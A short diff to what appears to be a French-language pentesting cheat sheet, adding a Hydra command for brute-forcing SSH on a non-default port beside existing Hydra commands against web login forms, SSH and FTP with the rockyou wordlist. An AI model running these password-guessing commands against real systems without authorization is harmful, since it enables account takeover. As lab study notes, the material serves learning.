@@ -37,6 +37,7 @@
 - Password WEB --> `hydra -l molly -P rockyou.txt 10.10.212.76 http-post-form "/login:username=^USER^&password=^PASS^:incorrect" -V`
 
 - Password SSH --> `hydra -l molly -P rockyou.txt 10.10.212.76 ssh`
+	- Port spécifique --> `hydra -s 1234 -l paul -P rockyou.txt 192.168.1.1 ssh`
 
 - Password FTP --> `hydra -l chris -P /usr/share/wordlist/rockyou.txt 10.10.150.97 ftp`
 
